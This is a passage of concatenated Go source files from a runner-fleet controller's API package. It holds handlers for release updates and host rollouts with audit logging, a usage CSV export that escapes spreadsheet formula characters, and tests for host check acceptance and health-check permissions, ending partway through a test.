package api

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"maps"
	"net/http"
	"slices"

	"github.com/eyupio/zoomies/internal/controller"
)

// The update routes are transport. What an update would take, and why, is the
// controller's to say, and the handler renders it.

// updatesResponse is GET /updates, and the payload of updates.updated.
type updatesResponse = controller.UpdatesView

// handleGetUpdates answers GET /api/v1/updates.
//
// It answers 200 whatever the mode and whatever has been read: the page that
// reads it is the one an operator opens to find out why nothing is offered, and a
// refusal would leave it with nothing to say.
func (s *Server) handleGetUpdates(w http.ResponseWriter, r *http.Request) {
	status, err := s.ctrl.UpdatesView(r.Context())
	if err != nil {
		s.internal(w, r, "working out the update status", err)
		return
	}
	writeJSON(w, http.StatusOK, status.For(isPlatform(r)))
}

// handleCheckUpdates answers POST /api/v1/updates/check: ask GitHub for the
// release list now, and answer with what the status is once it has been read.
//
// A press inside the minute is not an error and is not asked of GitHub again: the
// controller returns as though it had asked, and the status is the one the last
// request left.
func (s *Server) handleCheckUpdates(w http.ResponseWriter, r *http.Request) {
	if err := s.ctrl.CheckForReleases(r.Context()); err != nil {
		s.failUpdate(w, r, err)
		return
	}
	status, err := s.ctrl.UpdatesView(r.Context())
	if err != nil {
		s.internal(w, r, "working out the update status", err)
		return
	}
	writeJSON(w, http.StatusOK, status.For(isPlatform(r)))
}

// updateControllerRequest is the body of POST /updates/controller.
type updateControllerRequest struct {
	// Tag is the release to take. Left out, it is the newest that can be installed
	// on this system.
	Tag string `json:"tag"`
}

// handleUpdateController answers POST /api/v1/updates/controller: ask the update
// helper beside the controller to replace its binary.
//
// It answers 202, because the request is made and nothing is done: the helper
// answers on its own time, and the page learns how it went from the status. The
// audit row is written once the controller has said yes, so a refused press, which
// changed nothing, leaves none.
func (s *Server) handleUpdateController(w http.ResponseWriter, r *http.Request) {
	var in updateControllerRequest
	if !decodeUpdateRequest(w, r, &in) {
		return
	}
	id := Identity(r.Context())
	status, attemptID, err := s.ctrl.RequestControllerUpdateAttempt(r.Context(), controller.UpdateActor{ID: id.ID, Name: id.Name}, in.Tag)
	if err != nil {
		s.failUpdate(w, r, err)
		return
	}
	// Detached from the request: the helper may already be running what was asked,
	// and a browser that gave up waiting must not leave that with no record of who
	// asked.
	detail := map[string]any{}
	if attempt := status.Controller; attempt != nil {
		detail["from"], detail["to"] = attempt.From, attempt.To
	}
	s.auth.Auditor().Act(context.WithoutCancel(r.Context()), id, "update.controller_requested", "update", attemptID, detail)
	writeJSON(w, http.StatusAccepted, status.For(isPlatform(r)))
}

// maxRolloutBodyBytes bounds the body of POST /updates/hosts. A list of host ids
// for a fleet of thousands fits in it many times over, and the controller reads
// every id against the fleet, so the bound is the server's general one cut to
// what a list a person chose can need.
const maxRolloutBodyBytes = 64 << 10

// handleStartRollout answers POST /api/v1/updates/hosts: start a rollout of every
// host behind this controller's release, or of the hosts the body names.
//
// It answers 202, because nothing is asked of a host here: the planner moves the
// rollout on from its next pass, one host at a time, and the page follows it in
// updates.updated. One press writes one rollout row and no request, so it can
// never spend the helpers' start limit on its own.
func (s *Server) handleStartRollout(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, maxRolloutBodyBytes)
	hostIDs, ok := decodeRolloutRequest(w, r)
	if !ok {
		return
	}
	id := Identity(r.Context())
	status, change, err := s.ctrl.StartHostRollout(r.Context(), controller.UpdateActor{ID: id.ID, Name: id.Name}, hostIDs)
	// Audited before the error is looked at: a rollout that was written exists
	// whether or not the status after it could be worked out, and a press with no
	// row is one nobody can account for.
	if change.ID != "" {
		detail := map[string]any{}
		if len(hostIDs) > 0 {
			detail["host_ids"] = dedupe(hostIDs)
		}
		s.auditRollout(r, "update.rollout_started", change, detail)
	}
	if errors.Is(err, controller.ErrUnknownHost) {
		// An id the body named is the body to fix, and the controller's sentence
		// names it.
		unprocessable(w, err.Error(), []fieldError{{"host_ids", err.Error()}})
		return
	}
	if err != nil {
		s.failUpdate(w, r, err)
		return
	}
	writeJSON(w, http.StatusAccepted, status.For(isPlatform(r)))
}

// handleResumeRollout answers POST /api/v1/updates/rollout/resume: let a halted
// rollout carry on. It answers 202 for the same reason a start does: the next
// host is asked on the planner's pass, not here.
func (s *Server) handleResumeRollout(w http.ResponseWriter, r *http.Request) {
	if !decodeNoUpdateBody(w, r) {
		return
	}
	id := Identity(r.Context())
	status, change, err := s.ctrl.ResumeRollout(r.Context(), controller.UpdateActor{ID: id.ID, Name: id.Name})
	if change.ID != "" {
		s.auditRollout(r, "update.rollout_resumed", change, map[string]any{"changed": change.Changed})
	}
	if err != nil {
		s.failUpdate(w, r, err)
		return
	}
	writeJSON(w, http.StatusAccepted, status.For(isPlatform(r)))
}

// handleCancelRollout answers DELETE /api/v1/updates/rollout: end the open
// rollout. It answers 200, because the cancel is done when it returns; an update
// a helper was already handed finishes by itself and is recorded.
func (s *Server) handleCancelRollout(w http.ResponseWriter, r *http.Request) {
	id := Identity(r.Context())
	status, change, err := s.ctrl.CancelRollout(r.Context(), controller.UpdateActor{ID: id.ID, Name: id.Name})
	if change.ID != "" {
		s.auditRollout(r, "update.rollout_cancelled", change, map[string]any{"changed": change.Changed})
	}
	if err != nil {
		s.failUpdate(w, r, err)
		return
	}
	writeJSON(w, http.StatusOK, status.For(isPlatform(r)))
}

// auditRollout writes the row for a person's press on the rollout the controller
// says it acted on. The controller writes none for a person, so this is the only
// record of who started, resumed or stopped a rollout. A resume or cancel that
// moved nothing is still a press, and its detail says changed is false. Detached
// from the request, because the rollout has changed whether or not the browser
// is still waiting.
func (s *Server) auditRollout(r *http.Request, action string, change controller.RolloutChange, detail map[string]any) {
	detail["to"] = change.Target
	s.auth.Auditor().Act(context.WithoutCancel(r.Context()), Identity(r.Context()), action, "update", change.ID, detail)
}

// dedupe is ids with each kept once, in the order first given, as the controller
// reads them.
func dedupe(ids []string) []string {
	out := make([]string, 0, len(ids))
	for _, id := range ids {
		if !slices.Contains(out, id) {
			out = append(out, id)
		}
	}
	return out
}

// decodeRolloutRequest reads the optional body of POST /updates/hosts: no body,
// or one without host_ids, is every host behind; host_ids is the hosts to take.
//
// A list that is there must name at least one host, each by a non-empty id. An
// empty or null list is refused rather than read as every host, because a client
// whose selection came out empty asked for none, and walking the whole fleet is
// the opposite of that.
func decodeRolloutRequest(w http.ResponseWriter, r *http.Request) ([]string, bool) {
	const usage = `send a JSON object such as {"host_ids": ["hst_k3f9qz2m"]}, or no body to update every host behind`
	fields, ok := readUpdateFields(w, r, usage)
	if !ok {
		return nil, false
	}
	for _, name := range slices.Sorted(maps.Keys(fields)) {
		if name != "host_ids" {
			unprocessable(w, "", []fieldError{{name, "this endpoint takes only host_ids; remove " + name}})
			return nil, false
		}
	}
	raw, ok := fields["host_ids"]
	if !ok {
		return nil, true
	}
	const want = "host_ids must be a list of host ids, such as [\"hst_k3f9qz2m\"]; leave it out to update every host behind"
	var ids []string
	if string(bytes.TrimSpace(raw)) == "null" || json.Unmarshal(raw, &ids) != nil {
		unprocessable(w, "", []fieldError{{"host_ids", want}})
		return nil, false
	}
	if len(ids) == 0 {
		unprocessable(w, "", []fieldError{{"host_ids", "host_ids names no host; name at least one, or leave it out to update every host behind"}})
		return nil, false
	}
	if slices.Contains(ids, "") {
		unprocessable(w, "", []fieldError{{"host_ids", "host_ids holds an empty id; every entry must be a host id, as zoomies hosts list shows"}})
		return nil, false
	}
	return ids, true
}

// updateRefusalCodes gives each refusal the controller can make the code a client
// switches on. A refusal that wraps its sentinel to add a detail keeps its code.
//
// ErrUpdateFenced is not here: a controller that may not act is the plain
// conflict every other handler answers, and a page can do nothing different about
// it than wait.
var updateRefusalCodes = []struct {
	err  error
	code string
}{
	{controller.ErrUpdateModeOff, codeUpdateModeOff},
	{controller.ErrUpdateCheckDisabled, codeUpdateCheckDisabled},
	{controller.ErrUpdateHelperMissing, codeUpdateHelperMissing},
	{controller.ErrUpdateInProgress, codeUpdateInProgress},
	{controller.ErrUpdateNotARelease, codeUpdateNotARelease},
	{controller.ErrUpdateNothingNewer, codeUpdateNothingNewer},
	{controller.ErrUpdateHostCannotUpdate, codeUpdateHostCannotUpdate},
	{controller.ErrUpdateRolloutHalted, codeUpdateRolloutHalted},
	{controller.ErrUpdateFenced, codeConflict},
}

// failUpdate answers an error from an update call: a refusal as the 409 its code
// names, a release check that GitHub or the network would not finish as a 502,
// each with the sentence the controller wrote for the person who pressed the
// button, and anything else as the server failure it is.
func (s *Server) failUpdate(w http.ResponseWriter, r *http.Request, err error) {
	if errors.Is(err, controller.ErrUpdateCheckFailed) {
		// Upstream's failure, not this controller's, so it is a warning: an error in
		// the log teaches an operator to look for a fault that is not there. The
		// sentence is the controller's, written for the person who pressed the
		// button.
		s.logger(r).Warn("the release check could not be completed", "error", err)
		writeError(w, http.StatusBadGateway, errorEnvelope{Error: errorBody{Code: codeUpdateCheckFailed, Message: err.Error()}})
		return
	}
	for _, refusal := range updateRefusalCodes {
		if errors.Is(err, refusal.err) {
			writeError(w, http.StatusConflict, errorEnvelope{Error: errorBody{Code: refusal.code, Message: err.Error()}})
			return
		}
	}
	s.fail(w, r, "working out the update", err)
}

// decodeUpdateRequest reads the optional body of POST /updates/controller.
//
// An empty body is allowed, and so is a null one, which says what no body does.
// A field the endpoint does not define is a 422 naming it, not a 400: the body is
// valid JSON and was understood, and the field is what to go back and fix. A typo
// that was ignored would be a 202 for a request that did not say what its sender
// meant.
func decodeUpdateRequest(w http.ResponseWriter, r *http.Request, into *updateControllerRequest) bool {
	fields, ok := readUpdateFields(w, r, `send a JSON object such as {"tag": "v1.3.5"}, or no body to take the newest release`)
	if !ok {
		return false
	}
	// In name order, so that a body with two mistakes is always told about the
	// same one first.
	for _, name := range slices.Sorted(maps.Keys(fields)) {
		if name != "tag" {
			unprocessable(w, "", []fieldError{{name, "this endpoint takes only a tag; remove " + name}})
			return false
		}
	}
	if raw, ok := fields["tag"]; ok {
		if err := json.Unmarshal(raw, &into.Tag); err != nil {
			unprocessable(w, "", []fieldError{{"tag", "the tag must be text such as v1.3.5, or left out for the newest release"}})
			return false
		}
	}
	return true
}

// decodeNoUpdateBody reads the body of POST /hosts/{id}/update, which has none to
// give: a host is taken to the release the controller runs, and which host is in
// the path. A body that would have edited the host the way PATCH does, or named a
// release the way the controller's route does, is refused with the field named and
// not ignored, because a 202 would tell its sender the host was changed as asked.
func decodeNoUpdateBody(w http.ResponseWriter, r *http.Request) bool {
	fields, ok := readUpdateFields(w, r, "send no body, or an empty JSON object")
	if !ok {
		return false
	}
	if len(fields) > 0 {
		// The first in name order, so that a body with two mistakes is always told
		// about the same one.
		name := slices.Sorted(maps.Keys(fields))[0]
		unprocessable(w, "", []fieldError{{name, "this endpoint takes no body; remove " + name}})
		return false
	}
	return true
}

// readUpdateFields reads the JSON object a body holds as its fields, none for no
// body or a null one. A body that is not an object at all is told what to send
// (usage), in words that name no type of the server's.
func readUpdateFields(w http.ResponseWriter, r *http.Request, usage string) (map[string]json.RawMessage, bool) {
	if r.ContentLength == 0 {
		return nil, true
	}
	var body json.RawMessage
	if !decodeLenient(w, r, &body) {
		return nil, false
	}
	body = bytes.TrimSpace(body)
	if string(body) == "null" {
		return nil, true
	}
	var fields map[string]json.RawMessage
	if len(body) == 0 || body[0] != '{' || json.Unmarshal(body, &fields) != nil {
		unprocessable(w, usage, nil)
		return nil, false
	}
	return fields, true
}

package api

import (
	"encoding/csv"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

const maxUsageRange = 366 * 24 * time.Hour

// maxSubDailyBuckets bounds a request for buckets narrower than a day. A
// fortnight of hours is 336 buckets a row, which is a punch card of a week
// with room to spare; a year of hours would be 8,784 a row, multiplied by
// every repository. The bound is on the count rather than on the range, so
// a wider bucket reaches further back for the same cost: 56 days of four
// hours, 112 of eight.
const maxSubDailyBuckets = 14 * 24

// usageQuery is what the two usage routes agree a request means.
type usageQuery struct {
	from, to time.Time
	group    store.UsageGroup
	interval store.UsageInterval
}

func usageParams(r *http.Request) (usageQuery, error) {
	var q usageQuery
	from, to := r.URL.Query().Get("from"), r.URL.Query().Get("to")
	f, err := time.Parse(time.RFC3339, from)
	if err != nil {
		return q, fmt.Errorf("from is required and must be RFC 3339")
	}
	t, err := time.Parse(time.RFC3339, to)
	if err != nil {
		return q, fmt.Errorf("to is required and must be RFC 3339")
	}
	if !f.Before(t) {
		return q, fmt.Errorf("from must be before to")
	}
	if t.Sub(f) > maxUsageRange {
		return q, fmt.Errorf("date range cannot exceed 366 days")
	}
	g := store.UsageGroup(r.URL.Query().Get("group_by"))
	if g == "" {
		g = store.UsageByPool
	}
	switch g {
	case store.UsageByHost, store.UsageByPool, store.UsageByInstallation, store.UsageByRepository, store.UsageByWorkflow:
	default:
		return q, fmt.Errorf("group_by must be installation, repository, workflow, host, or pool")
	}
	interval := store.UsageInterval(r.URL.Query().Get("interval"))
	if !interval.Known() {
		return q, fmt.Errorf("interval must be hour, 2h, 3h, 4h, 6h, 8h, 12h or day")
	}
	// Left to the rule, a window is hourly only up to two days, well inside.
	if width := interval.Width(f, t); width < 24*time.Hour {
		if reach := maxSubDailyBuckets * width; t.Sub(f) > reach {
			name := "hourly"
			if width > time.Hour {
				name = string(interval)
			}
			return q, fmt.Errorf("%s buckets cover at most %d days; ask for wider buckets, or a shorter range",
				name, int(reach/(24*time.Hour)))
		}
	}
	return usageQuery{from: f, to: t, group: g, interval: interval}, nil
}

func (s *Server) handleUsage(w http.ResponseWriter, r *http.Request) {
	q, err := usageParams(r)
	if err != nil {
		badRequest(w, err.Error())
		return
	}
	f, t, g := q.from, q.to, q.group
	rows, err := s.ctrl.Store().UsageWithInterval(r.Context(), f, t, g, q.interval)
	if err != nil {
		s.internal(w, r, "querying usage", err)
		return
	}
	rows = filterUsageRows(rows, r)
	history, err := s.usageHistoryFrom(r)
	if err != nil {
		s.internal(w, r, "reading where usage history begins", err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"from": f, "to": t, "group_by": g, "items": rows,
		"costs_are_estimates": true,
		// Told to the client even when items is empty, so the page can explain
		// an absent runner-hours column rather than leaving it blank.
		"allocation_attributable": store.UsageAllocationAttributable(g),
		"history_from":            history,
	})
}

// usageHistoryFrom is the earliest instant each side of the usage aggregate
// can still be computed from, given what the prune loop has already deleted.
//
// Job figures are read from job rows, which are kept thirty days by default.
// Runner allocation is read from the usage ledger -- the daily roll-up and the
// sessions behind it -- as well as the runner rows, so it begins where the
// ledger begins however short retention.runners is: on a database upgraded
// into the ledger, that is the oldest runner row the upgrade found. A report
// over a longer range is not wrong for the days it has history for, but it is
// silently short for the days it has not, so the response says where each
// history begins and the page says so beside the figure. A window of zero
// keeps everything and is reported as null.
func (s *Server) usageHistoryFrom(r *http.Request) (map[string]*time.Time, error) {
	now := s.ctrl.Now()
	since := func(window time.Duration) *time.Time {
		if window <= 0 {
			return nil
		}
		t := now.Add(-window)
		return &t
	}
	ret := s.cfg().Retention
	runners := since(ret.Runners)
	if runners != nil {
		ledger, err := s.ctrl.Store().UsageLedgerFrom(r.Context())
		if err != nil {
			return nil, err
		}
		if ledger != nil && ledger.Before(*runners) {
			runners = ledger
		}
	}
	return map[string]*time.Time{"jobs": since(ret.Jobs), "runners": runners}, nil
}

func (s *Server) handleUsageCSV(w http.ResponseWriter, r *http.Request) {
	q, err := usageParams(r)
	if err != nil {
		badRequest(w, err.Error())
		return
	}
	rows, err := s.ctrl.Store().UsageWithInterval(r.Context(), q.from, q.to, q.group, q.interval)
	if err != nil {
		s.internal(w, r, "querying usage", err)
		return
	}
	rows = filterUsageRows(rows, r)
	history, err := s.usageHistoryFrom(r)
	if err != nil {
		s.internal(w, r, "reading where usage history begins", err)
		return
	}
	// The export leaves the page behind, so it carries the page's caveat with
	// it: a spreadsheet reconciled against a bill should say where its runner
	// history begins as plainly as the page does. It is a column on every row
	// rather than a preamble, because a preamble breaks every CSV reader.
	instant := func(t *time.Time) string {
		if t == nil {
			return ""
		}
		return t.UTC().Format(time.RFC3339)
	}
	jobsFrom, runnersFrom := instant(history["jobs"]), instant(history["runners"])
	// Grouped by installation, each row also carries the installation
	// report's counts over the same range, and where they are complete from.
	// Any other grouping leaves them blank: the counts are defined per
	// installation and a share of them per repository would be invented.
	var counts map[string]store.InstallationCounts
	countsFrom := ""
	if q.group == store.UsageByInstallation {
		var from time.Time
		counts, from, _, err = s.ctrl.Store().InstallationCountsBetween(r.Context(), q.from, q.to)
		if err != nil {
			s.internal(w, r, "counting the installation report", err)
			return
		}
		countsFrom = from.UTC().Format(time.RFC3339)
	}
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", `attachment; filename="zoomies-usage.csv"`)
	c := csv.NewWriter(w)
	_ = c.Write([]string{"group", "job_execution_seconds", "allocated_runner_seconds", "jobs_queued", "jobs_started", "jobs_completed", "average_queue_wait_seconds", "peak_concurrency", "estimated_cost", "history_from_jobs", "history_from_runners",
		"jobs_observed", "jobs_eligible", "jobs_created_for", "jobs_ran_here", "jobs_ran_elsewhere", "jobs_fleet_fault",
		"cleanup_pending", "cleanup_converged", "counts_from"})
	for _, x := range rows {
		cost := ""
		if x.EstimatedCost != nil {
			cost = strconv.FormatFloat(*x.EstimatedCost, 'f', 2, 64)
		}
		// A blank cell is the honest rendering of "not calculated for this
		// grouping"; a spreadsheet would sum a zero.
		report := make([]string, 9)
		if counts != nil {
			n := counts[x.Key]
			for i, v := range []int{n.Observed, n.Eligible, n.CreatedFor, n.RanHere, n.RanElsewhere, n.FleetFault,
				n.CleanupPending, n.CleanupConverged} {
				report[i] = strconv.Itoa(v)
			}
			report[8] = countsFrom
		}
		_ = c.Write(append([]string{csvText(x.Key), fmt.Sprint(x.JobExecutionSeconds), optionalFloat(x.AllocatedRunnerSeconds),
			strconv.Itoa(x.Jobs), strconv.Itoa(x.JobsStarted), strconv.Itoa(x.JobsCompleted),
			optionalFloat(x.AverageQueueWaitSeconds), strconv.Itoa(x.PeakConcurrency), cost, jobsFrom, runnersFrom}, report...))
	}
	c.Flush()
}

func optionalFloat(v *float64) string {
	if v == nil {
		return ""
	}
	return fmt.Sprint(*v)
}

// csvText makes a free-text cell safe to open in a spreadsheet.
//
// Excel and Sheets evaluate a cell that begins with =, +, -, @, a tab or a
// carriage return, and CSV quoting does not stop them: the quotes are gone by
// the time the cell is read. The group column carries names that GitHub
// payloads supplied -- a workflow can be called anything, by anyone who can
// push to a repository the App can see -- so a leading formula character is
// somebody else's to choose. A leading apostrophe is the spreadsheet
// convention for "this is text", and it is not shown in the cell.
func csvText(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

func filterUsageRows(rows []store.UsageRow, r *http.Request) []store.UsageRow {
	if keys, ok := r.URL.Query()["key"]; ok && len(keys) > 0 {
		out := make([]store.UsageRow, 0)
		for _, row := range rows {
			if row.Key == keys[0] {
				out = append(out, row)
			}
		}
		return out
	}
	return rows
}

package api

import (
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/auth"
	"github.com/eyupio/zoomies/internal/hosttune"
	"github.com/eyupio/zoomies/internal/store"
)

// acceptanceHost is a host whose agent has reported one counted warning, which
// is the only thing there is to accept.
func (h *harness) acceptanceHost(name string) *store.Host {
	h.t.Helper()
	host := h.host(name)
	r := &hosttune.Report{CheckedAt: h.ctrl.Now(), OS: "linux", Distro: "ubuntu 24.04", Results: []hosttune.Result{
		{ID: "docker.logs", Title: "Docker log rotation", Tier: hosttune.Safe, Status: hosttune.Warn, Current: "no rotation", Recommended: "10m x 3"},
		{ID: "disk.space", Title: "Work directory free space", Tier: hosttune.Safe, Status: hosttune.Warn, Current: "3% free (3.0 GiB)"},
	}}
	if _, err := h.ctrl.Heartbeat(h.ctx, host.ID, agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Doctor: r}); err != nil {
		h.t.Fatal(err)
	}
	return host
}

func acceptBody(check string) map[string]any {
	return map[string]any{
		"check_id": check, "seen_current": "no rotation",
		"reason":     "rotation is done by the log shipper on this machine",
		"expires_at": time.Now().Add(30 * 24 * time.Hour).UTC().Format(time.RFC3339),
	}
}

// An operator can accept and revoke; a viewer can do neither. The permission is
// the point: silencing a host's alarm is a decision, and it is the operator's.
func TestOnlyAnOperatorCanAcceptOrRevokeAHostCheck(t *testing.T) {
	h := newHarness(t)
	host := h.acceptanceHost("accept-rbac")
	path := "/api/v1/hosts/" + host.ID + "/check-acceptances"
	_, viewer := h.user("viewer-accept", store.RoleViewer)
	_, operator := h.user("operator-accept", store.RoleOperator)

	h.do(request{method: http.MethodPut, path: path, body: acceptBody("docker.logs"), cookie: viewer}).
		mustStatus(t, http.StatusForbidden, "a viewer accepting")
	res := h.do(request{method: http.MethodPut, path: path, body: acceptBody("docker.logs"), cookie: operator})
	res.mustStatus(t, http.StatusOK, "an operator accepting")
	doc := res.json(t)["doctor"].(map[string]any)
	if doc["summary"].(map[string]any)["accepted"].(float64) != 1 {
		t.Errorf("the answer is not the host as it now stands: %v", doc["summary"])
	}
	h.do(request{method: http.MethodDelete, path: path + "/docker.logs", cookie: viewer}).
		mustStatus(t, http.StatusForbidden, "a viewer revoking")
	h.do(request{method: http.MethodDelete, path: path + "/docker.logs", cookie: operator}).
		mustStatus(t, http.StatusOK, "an operator revoking")
}

// A token narrowed to reading hosts, or to cordoning them, must not be able to
// silence a check: the scope is hosts:accept (or hosts:* or *).
func TestATokenNeedsTheAcceptScopeToAcceptAHostCheck(t *testing.T) {
	h := newHarness(t)
	host := h.acceptanceHost("accept-scope")
	path := "/api/v1/hosts/" + host.ID + "/check-acceptances"
	for scope, want := range map[string]int{
		"hosts:read": http.StatusForbidden, "hosts:cordon": http.StatusForbidden,
		"hosts:accept": http.StatusOK, "hosts:*": http.StatusOK,
	} {
		tok := h.token("accept-"+strings.ReplaceAll(scope, ":", "-"), store.RoleOperator, scope)
		h.do(request{method: http.MethodPut, path: path, body: acceptBody("docker.logs"), token: tok}).
			mustStatus(t, want, "scope "+scope)
	}
	if got := auth.ActionHostsAccept.Scope(); got != "hosts:accept" {
		t.Errorf("scope = %q, want hosts:accept", got)
	}
}

func TestAcceptingARefusedCheckAnswers422OnTheCheck(t *testing.T) {
	h := newHarness(t)
	host := h.acceptanceHost("accept-refuse")
	_, op := h.user("operator-refuse", store.RoleOperator)
	path := "/api/v1/hosts/" + host.ID + "/check-acceptances"
	for _, id := range []string{"disk.space", hosttune.KernelPending, "no.such.check"} {
		res := h.do(request{method: http.MethodPut, path: path, body: acceptBody(id), cookie: op})
		res.mustStatus(t, http.StatusUnprocessableEntity, id)
		if f := res.json(t)["error"].(map[string]any)["field"]; f != "check_id" {
			t.Errorf("%s: field = %v, want check_id", id, f)
		}
	}
	short := acceptBody("docker.logs")
	short["reason"] = "too short"
	short["expires_at"] = time.Now().Add(-time.Hour).UTC().Format(time.RFC3339)
	res := h.do(request{method: http.MethodPut, path: path, body: short, cookie: op})
	res.mustStatus(t, http.StatusUnprocessableEntity, "bad reason and end")
	if errs, _ := res.json(t)["errors"].([]any); len(errs) != 2 {
		t.Errorf("errors = %v, want both fields at once", errs)
	}
	long := acceptBody("docker.logs")
	long["expires_at"] = time.Now().Add(400 * 24 * time.Hour).UTC().Format(time.RFC3339)
	h.do(request{method: http.MethodPut, path: path, body: long, cookie: op}).
		mustStatus(t, http.StatusUnprocessableEntity, "an end more than a year away")
	stale := acceptBody("docker.logs")
	stale["seen_current"] = "something else"
	h.do(request{method: http.MethodPut, path: path, body: stale, cookie: op}).
		mustStatus(t, http.StatusConflict, "a value that changed while deciding")
	h.do(request{method: http.MethodPut, path: "/api/v1/hosts/missing/check-acceptances", body: acceptBody("docker.logs"), cookie: op}).
		mustStatus(t, http.StatusNotFound, "an unknown host")
}

// Double accept replaces, revoke is idempotent, and the audit log keeps the
// person's reason: only a decision that changed something has a row.
func TestAcceptAndRevokeAreAuditedWithTheReason(t *testing.T) {
	h := newHarness(t)
	host := h.acceptanceHost("accept-audit")
	_, op := h.user("operator-audit", store.RoleOperator)
	path := "/api/v1/hosts/" + host.ID + "/check-acceptances"
	for i := 0; i < 2; i++ {
		h.do(request{method: http.MethodPut, path: path, body: acceptBody("docker.logs"), cookie: op}).
			mustStatus(t, http.StatusOK, "accepting")
	}
	got, _ := h.st.GetHost(h.ctx, host.ID)
	if len(got.Acceptances) != 1 {
		t.Fatalf("two accepts left %d rows, want 1", len(got.Acceptances))
	}
	h.do(request{method: http.MethodDelete, path: path + "/docker.logs", cookie: op}).mustStatus(t, http.StatusOK, "revoking")
	h.do(request{method: http.MethodDelete, path: path + "/docker.logs", cookie: op}).mustStatus(t, http.StatusOK, "revoking again")

	accepted, _, _ := h.st.ListAudit(h.ctx, store.AuditFilter{Actions: []string{"host.check_accepted"}}, store.Page{Limit: 10})
	if len(accepted) != 2 || !strings.Contains(accepted[0].After, "rotation is done by the log shipper") || accepted[0].TargetID != host.ID {
		t.Errorf("accepted audit rows = %+v", accepted)
	}
	// The report's value is agent-written text; the log carries the person's
	// reason, not the host's words.
	if strings.Contains(accepted[0].After, `"current"`) {
		t.Errorf("audit row carries the host-reported value: %s", accepted[0].After)
	}
	revoked, _, _ := h.st.ListAudit(h.ctx, store.AuditFilter{Actions: []string{"host.check_revoked"}}, store.Page{Limit: 10})
	if len(revoked) != 1 {
		t.Errorf("revoked audit rows = %d, want 1: the second revoke ended nothing", len(revoked))
	}
}

package api

import (
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/auth"
	"github.com/eyupio/zoomies/internal/hosttune"
	"github.com/eyupio/zoomies/internal/store"
)

// checkableHost is a connected host whose agent has said it can answer a check,
// which is the only kind the route will queue a task for.
func (h *harness) checkableHost(name string) *store.Host {
	h.t.Helper()
	host := h.host(name)
	req := agent.HeartbeatRequest{ProtocolVersion: agent.ProtocolVersion, Features: []string{agent.FeatureHostCheck}}
	if _, err := h.ctrl.Heartbeat(h.ctx, host.ID, req); err != nil {
		h.t.Fatalf("Heartbeat: %v", err)
	}
	return host
}

func checkPath(host *store.Host) string { return "/api/v1/hosts/" + host.ID + "/health-check" }

// A check spends the host's CPU and forks a few dozen processes there, so it has
// a scope of its own: a token narrowed to reading, cordoning or accepting on
// hosts must not be able to start one.
func TestATokenNeedsTheCheckScopeToAskAHostToCheck(t *testing.T) {
	h := newHarness(t)
	for scope, want := range map[string]int{
		"hosts:read": http.StatusForbidden, "hosts:cordon": http.StatusForbidden,
		"hosts:accept": http.StatusForbidden, "hosts:write": http.StatusForbidden,
		"hosts:check": http.StatusAccepted, "hosts:*": http.StatusAccepted, "*": http.StatusAccepted,
	} {
		name := "scope-" + strings.NewReplacer(":", "-", "*", "all").Replace(scope)
		host := h.checkableHost(name)
		tok := h.token(name, store.RoleOperator, scope)
		h.do(request{method: http.MethodPost, path: checkPath(host), token: tok}).
			mustStatus(t, want, "scope "+scope)
	}
	if got := auth.ActionHostsCheck.Scope(); got != "hosts:check" {
		t.Errorf("scope = %q, want hosts:check", got)
	}
}

// Viewers never: the role is the second half of the same rule as the scope.
func TestOnlyAnOperatorCanAskAHostToCheck(t *testing.T) {
	h := newHarness(t)
	host := h.checkableHost("check-roles")
	_, viewer := h.user("check-viewer", store.RoleViewer)
	_, operator := h.user("check-operator", store.RoleOperator)
	h.do(request{method: http.MethodPost, path: checkPath(host), cookie: viewer}).
		mustStatus(t, http.StatusForbidden, "a viewer")
	h.do(request{method: http.MethodPost, path: checkPath(host), cookie: operator}).
		mustStatus(t, http.StatusAccepted, "an operator")
	h.do(request{method: http.MethodPost, path: "/api/v1/hosts/missing/health-check", cookie: operator}).
		mustStatus(t, http.StatusNotFound, "an unknown host")
}

// A press that queued a task is audited once; a repeat press while the agent has
// not answered changes nothing and so writes nothing, and the answer carries the
// state the page reads.
func TestAskingAHostToCheckIsAuditedOnceAndAnswersTheHost(t *testing.T) {
	h := newHarness(t)
	host := h.checkableHost("check-audit")
	_, op := h.user("check-audit-op", store.RoleOperator)
	for i := 0; i < 2; i++ {
		res := h.do(request{method: http.MethodPost, path: checkPath(host), cookie: op})
		res.mustStatus(t, http.StatusAccepted, "asking")
		var v struct {
			ID          string `json:"id"`
			HealthCheck *struct {
				State string `json:"state"`
			} `json:"health_check"`
		}
		res.into(t, &v)
		if v.ID != host.ID || v.HealthCheck == nil || v.HealthCheck.State != "asked" {
			t.Fatalf("press %d answered %s, want the host with health_check.state asked", i+1, truncate(res.body))
		}
	}
	rows, _, _ := h.st.ListAudit(h.ctx, store.AuditFilter{Actions: []string{"host.check_requested"}}, store.Page{Limit: 10})
	if len(rows) != 1 || rows[0].TargetID != host.ID {
		t.Errorf("audit rows = %+v, want exactly one for the host", rows)
	}
}

// Every refusal says what to do about it, and none of them queues or audits.
func TestAskingAHostThatCannotCheckAnswers409InWords(t *testing.T) {
	h := newHarness(t)
	_, op := h.user("check-refuse-op", store.RoleOperator)

	old := h.host("check-old-agent") // connected, but advertises no host-check
	away := &store.Host{
		Name: "check-away", Capacity: 4, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		Features: store.StringSlice{agent.FeatureHostCheck}, OS: "linux", Arch: "amd64",
		LastHeartbeat: time.Now().Add(-time.Hour),
	}
	if err := h.st.CreateHost(h.ctx, away); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name string
		host *store.Host
		want string
	}{
		{"an agent that cannot check on request", old, "cannot check on request"},
		{"a host that is not connected", away, "not connected"},
	} {
